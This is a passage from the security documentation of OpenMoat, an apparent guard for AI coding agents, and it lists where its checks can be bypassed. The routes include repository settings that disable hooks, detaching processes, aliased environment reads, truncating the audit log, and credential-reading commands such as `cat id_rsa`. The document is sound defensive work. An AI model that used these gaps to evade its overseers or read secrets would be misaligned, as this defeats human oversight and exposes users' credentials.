  `openmoat init`, `status` and `doctor` ask the `opencode` on `PATH` for its version
  and do not set up, or report as not protected, one before 1.3.4. Setting
  `XDG_CONFIG_HOME` or `HOME` for a nested `opencode` is not denied. The plugin reports
  loading from `server` and from `setup` alike (`openmoat guard --heartbeat --host
  opencode`, ADR-042), and `openmoat status` and `openmoat doctor` say "plugin not loaded
  yet", a note, until it has reported or sent a call since `openmoat init` wrote it or
  the `opencode` on the search path changed; OpenCode keeps its sessions in a database
  that commands loading no plugin write too, so the note cannot become a warning.
- **OpenCode tools OpenMoat does not check.** OpenCode hands every plugin's hook the
  same object, and the tool runs with what it holds after the last plugin: OpenCode 1's
  `args`, OpenCode 2's `tool` and `input`. Plugins in OpenCode 1's global `plugin` list
  load before OpenMoat's, a project's and (in OpenCode 2) every configured one after it,
  and in OpenCode 2 any plugin may register a hook later still. OpenMoat's plugin
  freezes OpenCode 1's arguments, and in OpenCode 2 replaces `tool` and `input` with
  the checked name and a frozen copy that cannot be reassigned, so a later plugin that
  changes them throws and the call is blocked; a plugin tool that changes its own
  arguments fails the same way. For an OpenCode 2 shell command it checked, the plugin
  also pins the command and shell when OpenCode starts it (`shell` `create.before`);
  a shell hook registered before OpenMoat's, a change of the shell's working directory
  or environment, a plugin that replaces a tool's implementation (`tool.transform`) or
  advertises a tool under another name (a session `context` hook, so the hook sees the
  advertised name) are not caught. Plugins and custom
  tools (`tools/*.{js,ts}`) run in OpenCode's process with the agent's rights and can
  change what any code there does, OpenMoat's plugin included; a project's
  `.opencode/plugins/` and the plugins its `opencode.json` lists load at start with no
  prompt. `openmoat doctor` and `openmoat status` warn about the files in a project's
  `.opencode/plugins/` and about what its `opencode.json` and `.opencode/opencode.json`
  set (plugins, MCP servers, permission rules, a model endpoint, formatter and language
  server commands, `{file:…}` values), not yet about `.opencode/plugin/` or the `.jsonc`
  spellings; writes to all of them ask (`runs-later`). A plugin can register a tool
  under a built-in's name (`bash`), which OpenMoat then checks as the built-in. The
  person's `!` shell commands and the `` !`…` `` shell of a command template run
  outside the hook; writes to commands ask (`runs-later`). `task` (OpenCode 1) and
  `subagent` (OpenCode 2), a subagent whose calls are hooks of their own with its own
  session id, so taint and grants do not follow the parent session, `todowrite`,
  `skill`, `question`, Code Mode's `execute` (each tool call it makes is checked on its
  own) and OpenCode 2's `opencode_session_rename`, `opencode_worktree_list` and
  `opencode_models` are `ungoverned`. On Windows `bash` (`shell` in OpenCode 2) may run
  Git Bash, PowerShell or `cmd`, so it is `unparseable` and left to OpenCode. A tool OpenMoat does not know (a
  plugin's or custom tool's) is decided as an MCP tool of its name with what its
  arguments name, as Copilot CLI's are; MCP tools are `<server>_<tool>`, traced to the
  server names in OpenCode's configuration the plugin sends, the longest when several
  begin the name. The MCP servers under `mcp` (and OpenCode 2's `mcp.servers`) in
  OpenCode's global `config.json`, `opencode.json` and `opencode.jsonc` and a project's
  `opencode.json[c]` and `.opencode/opencode.json[c]` are pinned like every host's
  (ADR-026); servers from `~/.opencode/`, `OPENCODE_CONFIG`, `OPENCODE_CONFIG_CONTENT`,
  a remote `.well-known/opencode`, the parent directories OpenCode 2 also reads, or
  managed configuration are not. The directory `OPENCODE_CONFIG_DIR` names when
  `openmoat init` runs, or the guard's environment names, is protected like the
  configuration directory. There is no OS
  sandbox from OpenMoat for OpenCode; run it under `openmoat run` for one.

  `guard` writes the reason of every deny to stderr, so Codex honours its exit 2, and
  turns its own panics into a deny. A crash that bypasses that (killed, aborted, out of
  memory) or a missing binary leaves Codex and `cn` with no way to block: neither has a
  fail-closed setting. Claude Code has one since 2.1.295 (`onFailure: "block"` on a
  `command` hook: a hook that cannot start, crashes, exits other than 0 or 2, or times
  out then blocks the call as exit 2 does). `openmoat init` writes it on the `PreToolUse`
  entry only when the `claude` on `PATH` reports 2.1.295 or later, because the docs do
  not say what an older Claude Code does with a key it does not know, and one hook entry
  its settings schema rejects can stop every hook from running. With an older Claude
  Code, or none on `PATH` (an IDE-only install), the key is left out and `openmoat doctor`
  warns. A key already written is kept, also after a downgrade below 2.1.295, which then
  depends on that older version ignoring it. `ConfigChange` gets no `onFailure`: a broken
  `openmoat` would then block every settings reload. Before 2.1.295, Claude Code's own deny
  rules for secrets and OpenMoat's files, which `openmoat init` writes on every OS, still
  hold for its file tools. A `guard` that hangs denies after 30 s, well
  before any host timeout `openmoat init` sets (60 s for the settings-change hook, 600 s
  for tool calls), so the host never reaches the timeout that would run the call; that
  deny goes to a side file (`~/.moat/guard-hangs.log`, which `openmoat doctor` reports with
  the step the guard was stuck in), not the audit log, because what hangs may be the
  audit log. The limit is wall-clock time, so a heavily loaded machine can reach it
  with a call that is only slow; the call is then denied, never allowed.

  [cc-hooks]: https://code.claude.com/docs/en/hooks
  [codex-hooks]: https://developers.openai.com/codex/hooks
  [codex-pre]: https://github.com/openai/codex/blob/main/codex-rs/hooks/src/events/pre_tool_use.rs
  [codex-runner]: https://github.com/openai/codex/blob/main/codex-rs/hooks/src/engine/command_runner.rs
  [cursor-hooks]: https://cursor.com/docs/agent/hooks
  [openclaw-hooks]: https://docs.openclaw.ai/plugins/hooks/reference
  [gemini-hooks]: https://geminicli.com/docs/hooks/reference/
  [hermes-hooks]: https://github.com/NousResearch/hermes-agent/blob/v0.22.5/agent/shell_hooks.py
  [cve-2026-53845]: https://nvd.nist.gov/vuln/detail/CVE-2026-53845
  [cn-runner]: https://github.com/continuedev/continue/blob/main/extensions/cli/src/hooks/hookRunner.ts
- **GitHub Copilot CLI.** From its [hooks reference][copilot-hooks] and the
  `@github/copilot` 1.0.101 package (not yet tested against a signed-in `copilot`):
  a `preToolUse` hook that cannot start, crashes or exits non-zero denies the call
  (since 1.0.57; exit 2 denies whatever stdout says), but **a hook that times out is
  killed and the call goes on**: timeouts fail open for every event. `openmoat init`
  sets `timeoutSec` to 600 and the guard denies on its own after 30 s, so only a guard
  that cannot even run its own deadline reaches Copilot's. No output is no decision
  (Copilot's own permission flow); an `ask` is Copilot's prompt, which autopilot turns
  into a deny. **`disableAllHooks: true` in `~/.copilot/settings.json` or in a
  repository's `.github/copilot/settings.json` or `settings.local.json` skips every
  hook file**, OpenMoat's included; `kernel-self` denies the agent writes to those
  files, the hooks directory and the configuration directory, and `openmoat doctor` and
  `openmoat status` report Copilot as not protected while the user file sets it and
  warn about a repository that sets it. A repository's own
  `.github/hooks/*.json` load once the folder is trusted and run their commands with
  the person's rights; writing one asks (`runs-later`) and the two commands warn about
  each. Policy hooks an administrator puts in `/etc/github-copilot/policy.d` run first
  and are not OpenMoat's to check. The hook payload does not mark MCP tools, so any
  tool OpenMoat does not know is checked by the paths and URLs its arguments name,
  and by the shell commands under a command key (POLICY.md §6), as an MCP tool of
  that name.
  Copilot's MCP servers (`~/.copilot/mcp-config.json`, and a project's `.mcp.json` and
  `.github/mcp.json`, wrapped in `mcpServers` or bare; a write of any of them asks) are
  pinned (ADR-026), and a call is traced to its server by the `<server>-` prefix of the
  tool name: a changed server holds back the calls whose name starts with it.
  `write_bash` and `write_powershell` type keys into a shell (or a program it runs)
  that is already open, which joins them to what came before: the typed text is
  checked on its own and the call asks (`unchecked`), so a command split over two
  calls is never passed piece by piece. `powershell` is `unparseable`. Copilot's
  shells also keep their working directory between calls, while the payload names
  only the session's: a command that leaves its shell in a directory OpenMoat cannot
  know (`cd "$X"`, `cd -`, `popd`, `eval`) asks (`unchecked`), and a `cd` to a
  written-out directory is checked as a read of it (`cd ~/.ssh` is denied). **A later
  relative path is still checked against the session's directory**: after a person
  approves a `cd` out of the project (`cd ~` asks, `home-sweep`), a following
  `cd .ssh` and `cat id_rsa` resolve against the session's directory, not where the
  shell is.
  There is no OS sandbox from OpenMoat for Copilot CLI; run it under `openmoat run`
  for one.

  [copilot-hooks]: https://docs.github.com/en/copilot/reference/copilot-cli-reference/cli-hooks-reference
- **The Continue CLI.** The released Continue CLI does not run hooks: `cn` 1.5.47 (continuedev/continue
  `main` at `5522c6f`) loads them but fires no event (continuedev/continue#11043 closed
  unmerged), so OpenMoat cannot check its tool calls today. Run `cn` under `openmoat run`. When a
  release fires them, `cn` will load OpenMoat's Claude Code hook from
  `~/.claude/settings.json` and `.claude/settings.json`; `guard` already recognises
  `cn` and sends it every `ask` as a deny (ARCHITECTURE §5), and the table above shows
  what its hook runner does on a failure.
  `openmoat doctor` and `openmoat status` warn when `cn` is on the search path or its directory
  (`~/.continue`, or `CONTINUE_GLOBAL_DIR`) exists. `cn` names some tool arguments
  differently (`Read` `filepath`); those calls are denied as malformed.
- **Cursor file tools cannot ask.** Cursor runs a `preToolUse` call answered `ask`
  and accepts only allow or deny from `beforeReadFile`, so OpenMoat sends an `ask`
  there as a deny. A file write or read that needs approval is blocked until a person
  approves that exact file with `openmoat` or `openmoat allow --last`, or a policy allow rule
  covers it.
- **Ungoverned tools.** Claude Code orchestration tools whose own calls are hooked;
  Codex web search (a hosted tool its hook never sees) and other hosted tools;
  Cursor `Shell` and `MCP:<tool>` under `preToolUse` (governed by `beforeShellExecution`
  and `beforeMCPExecution` instead), `Task`, and to-do tools (`TodoWrite`) that name no path;
  Hermes Agent's `todo_list`, `clarify`, `session_search`, `skills_list`, `delegate_task`
  (its subagents' calls are hooked), `read_terminal`, `close_terminal` and the
  `process_manage` actions that only look at or stop a process. Ungoverned calls that reach the hook are
  recorded with rule `ungoverned` and left to the host's own permission flow (allowed
  under Cursor, whose hooks cannot leave a call undecided). Any other Cursor tool that names no path
  is `tool.unknown`, which the default policy defers; Cursor's `preToolUse` cannot
  prompt, so there OpenMoat asks (POLICY.md §5). Claude Code and Cursor `WebSearch` are
  governed: `web.search` in `defaults` decides them, and a search after a secret read asks.
- **No settings veto outside Claude Code.** Codex, Cursor and the other agents have no `ConfigChange`
  event, so a tampered hook file there is caught on the next tool call, not when it
  is written.
- **Claude Code project settings come from the repository.** OpenMoat pins only the
  user `settings.json`, which holds its hooks. Claude Code also loads a project's
  `.claude/settings.json` and `.claude/settings.local.json`, and the value a higher
  level sets wins ([cc-settings]): `"disableAllHooks": true` in a project file turns off
  every user, project and local hook, OpenMoat's included, and only hooks set in
  managed settings stay on ([cc-hooks], "Disable or remove hooks"). A project's own
  `hooks`, `env` (an API endpoint, a proxy) and command settings (`apiKeyHelper`,
  `awsAuthRefresh`, `awsCredentialExport`, `otelHeadersHelper`, `statusLine`,
  `subagentStatusLine`, `fileSuggestion`) run programs or redirect the agent, and
  `enableAllProjectMcpServers` or `enabledMcpjsonServers` makes Claude Code start the
  project's `.mcp.json` servers, which runs their commands when settings load; OpenMoat's
  MCP pins (ADR-026, ADR-032) hold back only their tool calls, not the start.
  `extraKnownMarketplaces` adds plugin sources, whose plugins can carry hooks.
  The agent cannot write these files itself (`kernel-self`, session taint), but a
  `git pull` or `checkout` can bring them in. *Mid-session:* a `ConfigChange` for such
  a file is blocked (`project-settings`) when it sets any of those keys, enables a
  plugin, sets `sandbox` beyond `{"enabled": true}`, or cannot be parsed; the session
  keeps its previous settings. The file is read a second time just before the
  decision, and a change in its bytes since the check blocks too, so a rewrite
  between the check and the decision is not let through; a rewrite after the
  decision, before Claude Code reads the file, is not seen. Skills and agents a
  repository plants (`.claude/skills/*/SKILL.md`, `.claude/agents/*.md`) can carry
  `hooks:` in their frontmatter; they are outside the settings files OpenMoat's
  `ConfigChange` hook matches, so this check does not cover them. Permission lists and modes still load: they decide only
  whether Claude Code asks about a call the hook left to it, and the hook runs in every
  mode. *At session start:* Claude Code loads the files of a cloned or checked-out
  project before any hook runs, and no `ConfigChange` fires, so OpenMoat cannot stop
  them; when hooks are off, `openmoat guard` never runs and records nothing. `openmoat doctor`
  and `openmoat status` warn when the current project's files set these keys. Only Claude
  Code managed settings make hooks immune: with OpenMoat's hook in managed settings,
  a `disableAllHooks` outside them cannot turn it off, and `allowManagedHooksOnly`
  also blocks user, project and local hooks and narrows `statusLine` to managed
  settings (INSTALL.md "Teams: managed settings"). Whether Claude Code's workspace
  trust dialog holds back a project's `env` or command settings is not documented
  where OpenMoat could check (*unverified*).

  [cc-settings]: https://code.claude.com/docs/en/settings
- **Codex runs only hooks a person trusted.** Codex skips a non-managed hook, new or
  changed, until the person reviews and trusts that exact definition in `/hooks`
  (trust is recorded against the hook's hash), and `[features] hooks = false` in a
  `config.toml` turns every hook off ([codex-hooks-doc]). OpenMoat cannot see the trust
  record, so after `openmoat init` Codex's own startup warning is the sign that the
  hook is not running yet. `openmoat status` and `openmoat doctor` report Codex as not
  protected while the user's `config.toml` turns hooks off, and warn about a trusted
  project's `.codex/config.toml` or `.codex/hooks.json` that turns them off, adds hooks
  (which run beside OpenMoat's), sets `notify`, starts MCP servers, changes the sandbox
  or the model provider. A project's Cursor `.cursor/hooks.json`, which a trusted
  workspace runs beside the user's hooks, is warned about the same way.

  [codex-hooks-doc]: https://learn.chatgpt.com/docs/hooks
- **Codex does not send a command's `workdir`.** Codex's shell tools take a `workdir`
  argument and run the command there, but the `PreToolUse` payload carries only the
  command, so a relative path in it is checked against the session's directory, not
  the one Codex runs it in. Absolute paths and `**/` patterns (`.env` anywhere) are
  unaffected, and Codex's own sandbox (the `openmoat` profile) still applies to the
  command where it runs. Until Codex sends `workdir`, OpenMoat cannot see it.
- **PowerShell is not parsed.** Claude Code `PowerShell` is always `unparseable`, which
  the default policy defers to Claude Code's own prompt (and an `ask` catch-all asks). A
  PowerShell line given to a POSIX shell tool is lexed as POSIX and usually falls through
  to the catch-all default.
- **Pattern lists are incomplete by nature.** Pseudo-terminal routes to `openmoat allow`
  (ADR-011, ADR-014), environment dumps through interpreters (`python -c
  'print(os.environ)'`, ADR-010), and options that run programs (ADR-012) are matched
  by lists. Spellings outside the lists defer to the agent's own prompt or, if a broad allow covers them, are
  allowed.
- **Interpreter code is scanned, not parsed.** A file that inline `python -c`, `node -e`
  or similar code opens for writing is not checked as a write. Environment reads are
  recognised by their usual spellings (`os.environ`, `os.getenv`, `process.env`, `ENV`,
  `$ENV{…}`, `%ENV`, `getenv`, `$env:` in any case), Python's `getattr(os, 'environ')`,
  `vars(os)`, `os.__dict__`, `os` reached through `__import__('os')` and `env`/`printenv` run as a child with a literal command
  (`os.popen('env')`, `subprocess.run(['printenv', 'X'])`), and PowerShell's
  `[Environment]::GetEnvironmentVariable(s)` and `Env:` drive (`Get-ChildItem Env:`,
  `gci`/`ls`/`dir env:`); the environment reached through an alias (`e = os.environ`
  or `g = getattr`, then `print(e)`), a command built at run time, or another spelling
  is not seen.
- **TOCTOU and hard links.** A link swapped between the check and the command
  running, and hard links that already exist, are not seen (ADR-009). Making a hard
  link is decided as a write of the file it links to (`ln` without an `-s` before
  its first operand, `link`, `cp -l`/`--link`, the directory of `rsync --link-dest`,
  also as GNU's `gln`/`gcp` and under `busybox`), so `kernel-self` and the
  other write denies hold for it; a hard link made another way (an interpreter's
  `os.link`, `cpio -l`, `pax -l`) is not seen.
- **Glob operands are expanded at decision time.** An unquoted `* ? [` path operand
  is checked as every file it matches when the hook runs (POLICY.md §4), with
  `bash` defaults (no `dotglob`, `nocaseglob` or `extglob`; `**` as `globstar`;
  a pattern starting with `.` also names `.` and `..`, as bash before 5.2 does). A
  file created between the check and the command that a pattern's last component
  matches is not seen. Shell options that change matching (`shopt -s dotglob
  nocaseglob extglob`, `zsh` `EXTENDED_GLOB` and `GLOB_DOTS`), `zsh` qualifiers and
  `<1-9>` ranges are not modelled. Brace expansion follows `bash`, also for shells
  that do not expand braces (`sh` as `dash`), where the literal word is not checked. Claude Code
  `Glob` and `Grep` are checked as reads of their search directory, as before:
  `Glob` returns names, not contents, and `Grep` searches the whole directory
  whatever its `glob` filter.
- **The terminal check is not a boundary.** `openmoat allow`, `openmoat edit`, `openmoat secret`, `openmoat trust`, `openmoat uninstall`,
  `openmoat sandbox sync`, `openmoat mcp accept`/`wrap`/`unwrap` and `openmoat doctor --accept` check
  for a TTY, and refuse when an
  agent (`claude`, `codex`, `cursor-agent`, the Continue CLI's `cn`, `copilot`, `gemini`,
  `hermes`, `openclaw`, `pi`, `opencode`, the Cursor editor's helper processes on macOS, or `openmoat run`) is
  among their parent processes; answers are read from `/dev/tty`. Cursor's editor agent
  runs its commands in the same process tree as the person's own terminals in the
  editor, so on macOS these commands refuse in a Cursor terminal too: run them in a
  terminal of your own. They also refuse to run from an executable other than the
  binary a policy lock records (the lock in `MOAT_HOME` and the one in `~/.moat` alike;
  a lock that exists but cannot be read refuses), or when started under a name other
  than `openmoat` or `moat`; `argv[0]` is the starter's choice, so the name check only
  adds to the file check. An agent can still detach a process from its own tree (a double
  fork, `setsid`, a launchd or systemd job), which the parent check cannot see; on
  Windows only the TTY is checked; and on Linux Cursor's editor is not told apart. A
  detached `openmoat init --yes` without a terminal (from a build script, say) refuses
  over a drifted or unreadable lock, and over an intact one leaves new and changed MCP
  server definitions unpinned, so a server a cloned project planted in `.mcp.json`
  stays denied until a person runs `openmoat mcp accept`. It also refuses a binary
  other than the one the lock records, and keeps the recorded agent directories
  (`hosts.json`) and search-path snapshot (`environment.json`) instead of taking them
  from its own environment. The `kernel-self` rules and
  the lock are what stop an agent from re-pinning or granting itself anything; the
  rules also see these commands started through a detaching launcher the command line
  shows (`setsid`, `systemd-run`, `daemonize`, `start-stop-daemon`, `launchctl
  submit`, an `at` or `batch` job).
- **Some agent settings may drift without stopping the guard.** Claude Code's
  `settings.json` is pinned, but a change limited to an allowlist of its keys
  (`crates/openmoat-cli/src/integrity/relaxed.rs`) does not deny every call: display
  and reply toggles, the model Claude Code writes when the person switches models
  (`model` as a string, `switchModelsOnFlag` as a string, number or boolean), and
  Claude Code's own `permissions.allow`, `ask`, `deny` and
  `blockReadsOutsideWorkingDirectories`, and `defaultMode` changed to `default`, `plan`
  or `dontAsk` (or removed). A `defaultMode` that runs calls unasked (`acceptEdits`,
  `auto`, `bypassPermissions`, any other value) and any change to
  `additionalDirectories` deny every call, like other drift. `permissions.allow` stays
  on the list: a rule there lets Claude Code run a call the policy defers without
  asking, which is the person's own setting in Claude Code.
  A changed model changes which model answers, not where requests go (`env`) or what
  runs; an object or list under either model key, or a key of another name such as
  `availableModels`, still denies.
  The hook still decides every call by the policy, and Claude Code obeys a hook deny in
  every permission mode, so these change only when Claude Code asks the person about a
  call the hook left to it. One of them widens more than prompts: with
  `blockReadsOutsideWorkingDirectories` off, sandboxed commands may read the home
  directory outside the working directories. No guard decision depends on the sandbox,
  `openmoat status` shows the agent as `hook only` while its sandbox differs from the
  policy, and `openmoat doctor` reports the drift until a person runs `openmoat doctor --accept`.
  A change under `hooks`, a key that runs a program or redirects the agent (`env`,
  `apiKeyHelper`, `awsAuthRefresh`, `awsCredentialExport`, `otelHeadersHelper`,
  `statusLine`, `fileSuggestion`, plugins, MCP servers, `sandbox`), a
  removed `permissions.deny` rule OpenMoat wrote, an unknown key, a symlink or a file
  that no longer parses still denies every call. The kernel-self rules deny the agent
  writes to the settings file in any case.
  Gemini CLI's `settings.json` has a list of its own in its `HostSpec`
  (`crates/openmoat-hosts/src/host/gemini_cli/settings.rs`, [POLICY.md](POLICY.md#8-the-policy-lock)):
  `model.name`, `security.auth.selectedType`, `ui.theme`, `general.vimMode`,
  `ide.hasSeenNudge` and display-only `ui.*` keys, each only as a string or a boolean.
  The lock pins the digest of that file with those keys taken out, so a change
  anywhere else is drift that denies, a listed key changed next to it included. A new
  model changes which model answers, not where its requests go (the sign-in method's
  endpoint, the environment) or what runs; a new sign-in method selects one of Gemini
  CLI's own, never a credential, and `security.auth.enforcedType` and `useExternal`
  stay pinned; a theme that is a path makes Gemini CLI read a JSON colour file in the
  home directory, which runs nothing. `hooks`, `hooksConfig`, `tools` (its sandbox,
  allowed, excluded and core tools, discovery and call commands), `mcpServers`, `mcp`,
  `extensions`, `security.folderTrust`, `context`, `advanced`, a key that names or
  starts a program, an unknown key, comments and a file that no longer parses still
  deny every call (attack tests: `crates/openmoat-cli/src/integrity/spec_keys/tests.rs`,
  `crates/openmoat-cli/tests/e2e/gemini_cli.rs`).
- **Repository rules are hook-only, and a repository can block itself.** A
  repository policy is merged into the hook decision only. Host sandboxes and
  `openmoat proxy` are generated per user from the user policy, so a repository deny is
  not enforced by an OS layer. A malicious or broken repository policy can deny
  every call in its own project (`kernel-error`). Any repository could do the same
  with one deny rule, and it fails closed. By itself it cannot widen anything: its
  ask rules never soften a user deny, and its allow rules wait for `openmoat trust`.
  Once trusted, its allow rules are as strong as the person's own, below the
  person's deny rules. A trusted repository whose maintainers turn malicious
  widens only through a new file version, which drops back to tightening-only
  until someone trusts it again (ADR-022).
- **The binary is pinned by path, not digest** (ADR-006, ADR-016). Whoever can replace
  the file the stable link points at decides what the hooks run. The recorded path, its
  directory and its link target are protected by literal path (`kernel-self`, every
  host sandbox, Claude Code's deny rules); a digest check would add nothing, since a
  replaced binary decides whether to run it.
- **Claude Code's `theme` setting is not pinned** (#287). Claude Code writes it to
  `settings.json` itself; it changes only colours, and every other key stays pinned.
- **`CLAUDE_CONFIG_DIR` must match for `init`.** `openmoat init` installs hooks where its
  own environment points and records that directory in `~/.moat/hosts.json`, which the
  lock pins; later commands use the record, not their shell's variables, and `doctor`
  reports a variable that disagrees (#298). An agent started with another directory
  than the recorded one is not hooked. Re-pinning (`allow`, `doctor --accept`) keeps
  every hook file the lock already pins, and `doctor`/`status` report an installed hook
  file the lock does not pin (#158). `kernel-self` covers both each agent's recorded
  directory and the one its variable names.

- **The audit chain is tamper-evident, not tamper-proof.** The hash chain
  ([ARCHITECTURE.md](ARCHITECTURE.md) §7) makes an edit, a deletion or a reordering in the middle of the
  log visible to `openmoat doctor`. It is unkeyed and lives in the file it protects, so
  whoever can write `~/.moat/audit.db` (the user's account, or an allowed command
  running as the user, see "Outside the sandboxes") can delete the newest events and leave a
  valid shorter chain (an agent's `sqlite3 ~/.moat/audit.db …` is a write that
  `kernel-self` denies), or rewrite events and recompute every hash after them. Keeping
  the head hash or count elsewhere on the same machine would need a second write on
  every `guard` call and could be rewritten by the same attacker, so it is not done.
  Anchoring the head off the machine is left to the person (ADR-031): `openmoat audit
  anchor --git <repo>` commits the head on `refs/moat/anchors` in a repository they
  name, or `--file` appends it to a file they keep, and `openmoat audit verify --against`
  later fails, naming the anchor, once an anchored event is gone or has another hash.
  An anchor is only as safe as where it is kept: one in a repository or file on the
  same machine that is never pushed or copied elsewhere can be rewritten by the same
  attacker, and OpenMoat sends nothing anywhere itself. Events after the newest anchor
  are not covered, and nor are events written before audit schema 2. `openmoat audit
  verify --anchor` checks an export against a recorded head the same way.
- **Reading OpenMoat's state.** `kernel-self` denies the agent reads of the audit log,
  the lock, `hosts.json`, the approvals, the trust records and the MCP pins, and the host
  sandboxes and `openmoat run` carry those denies. Landlock (`openmoat run` on Linux) only
  grants and cannot deny inside a granted tree, so there `openmoat run` refuses to start
  when a tree it grants (the project, a read root such as `/tmp`, a `--write` path,
  the temp directory) holds the state directory or lies inside it, symlinks resolved,
  and says to move `MOAT_HOME` out of it. `openmoat run --isolate` starts only where its
  mounts hide the state directory: below the temp directory, which it covers with an
  empty `tmpfs`. The default `~/.moat` is in none of the default grants. `openmoat doctor`
  warns on Linux when the state directory is inside the project, a read root or the
  temp directory.
  `policy.yaml` is readable on purpose: the rules are no secret, and an agent that can
  read them can explain a deny.
- **What a policy signature proves** (ADR-031). That a key the person trusted with
  `openmoat policy trust-key` signed those exact bytes in the namespace of their kind
  (`openmoat-repo-policy` for a repository policy, ADR-037, `openmoat-pack` for a pack,
  ADR-036), so one kind's signature is never taken for the other's, and one made in
  `openmoat-policy`, which earlier releases used for both, for neither; not that the signer meant well. A stolen signing key signs packs the person will
  install, and a trusted key's signed repository policy is trusted wherever
  `require_signed_repo_policy` is on. With it on, a repository policy no trusted key
  signed is not trusted even after `openmoat trust`, so a `trust.json` record cannot widen
  the policy on its own. Verification runs the system `ssh-keygen` found
  through the pinned environment snapshot, so a replaced `ssh-keygen` at that path is
  trusted as `git` is. A signed repository policy is checked on each call in the
  project, which costs an `ssh-keygen` run per trusted signer on each call there.
- **What verifying an export proves.** `openmoat audit verify` shows that every line is
  the event its hash commits to, and that runs of consecutive ids are unbroken
  links. It does not show that the export is complete. Dropping the newest lines,
  or exporting from a truncated log, leaves a file that verifies, and so does
  deleting a middle event, which looks like a filter gap. Only an anchored head
  catches those: a recorded hash that the export must contain. Without `--anchor`,
  `openmoat audit verify` reports the export as not anchored, and `--require-anchor`
  makes that a failure for scripts. The anchor does not
  cover events after it. Anyone who can write the database can recompute every hash
  before exporting (the chain is unkeyed), so an export is evidence about the log
  as it was at export time, no more. Exported cells are the redacted store cells.
  A secret shape that redaction learned after an event was recorded stays in that
  event.
- **What the push check sees.** It looks for token formats with a vendor prefix and
  for brokered values the guard can read (not keychain ones), in the lines a push's
  commits add and in their messages: a secret of no known format, an encoded or split
  value, and anything in a binary file are pushed. It reads the repository when the call
  is decided, so a commit made later on the same command line (`git commit -am x && git
  push`) is not checked, and neither is a push by another program (a script, `curl` to
  the forge's API) or one moved to another repository by a variable an earlier call
  exported. What the remote has is taken from the remote-tracking branches git knows
  of: commits git believes the remote has are not checked again, even if the remote has
  dropped them since. A sample
  token in a project's test data denies the push too; a person pushes it from a terminal.
- **What audit redaction guarantees.** The value of a brokered secret of 8 bytes or
  more never appears verbatim, in any letter case, in a row the proxy records, nor in
  the row of a call the policy decides in `openmoat guard` when the secret has a `file`
  or `env` source the guard can read. Known token formats are removed by pattern. Nothing else is guaranteed: a
  secret OpenMoat does not hold (one only in the agent's environment or files) and of
  no known format is stored as sent; so is a brokered value that was encoded (base64,
  URL escapes), split, or shorter than 8 bytes; a keychain-sourced value is not
  masked in guard rows; values from before a secret was added stay in old rows. The
  matcher's copy of the values is not zeroed when the process exits. Redaction limits
  what the log reveals; it does not stop the secret being sent, which is the policy's
  and the proxy's job.

## 6. How the claims are tested

- **Conformance suite.** `tests/conformance/{attacks,benign,ask}.yaml`: one tool
  call per fixture, with the verdict and rule ids the default policy must give. Every
  attack and ask fixture names its threat class, every class needs at least one
  attack fixture, and [COVERAGE.md](COVERAGE.md) is generated from them. Every valid
  bypass becomes a fixture before its fix is published.
- **End-to-end tests** run the real binary as a hook in isolated homes: lock drift,
  `ConfigChange`, approvals, install paths, every host's payloads.
- **MoatBench mini** ([MOATBENCH.md](MOATBENCH.md)): multi-step attack and benign
  scenarios sent as each agent's hook payloads to the real binary, with a
  scorecard of verdicts, false positives and known gaps.
- **Fuzzing.** `cargo fuzz` targets for the shell path through the engine, policy
  parsing, host payloads and `openmoat allow --always` patterns run in CI on every pull
  request and weekly.
- **Differential suite** (`tests/differential/scenarios.yaml`): each scenario runs
  against the hook decision and each host sandbox whose binary is present, and hostile
  project scripts run under `openmoat run`, Claude Code's sandbox and Codex's `openmoat`
  profile on macOS and Linux, with the OS outcome (`EPERM`, `EACCES`, a proxy's 403)
  asserted. CI's `standard tier` job runs the host sandboxes with pinned Claude Code
  and Codex binaries, a local fake API and no account. [EVIDENCE.md](EVIDENCE.md) is
  the results table, generated from the same file; known gaps are listed there as gaps.
- **Lexer against bash** (`crates/openmoat-core/tests/lexer_vs_bash.rs`): the conformance
  `shell:` lines and a set of quoting and operator cases run under a real bash with an
  empty `PATH`, whose `command_not_found_handle` records each command's argv, and the
  argv is compared with the lexer's words. Lines bash would expand (variables,
  substitutions, globs, braces, `~`) or that use builtins are skipped. CI's `lexer-vs-bash`
  job runs it on Linux; it is not a required check yet.
- **Planned:** the full MoatBench, which measures attack success with and without OpenMoat across live agents ([ROADMAP.md](ROADMAP.md)). Prompt fatigue is measured
  today only by `openmoat report` (asks per active hour).
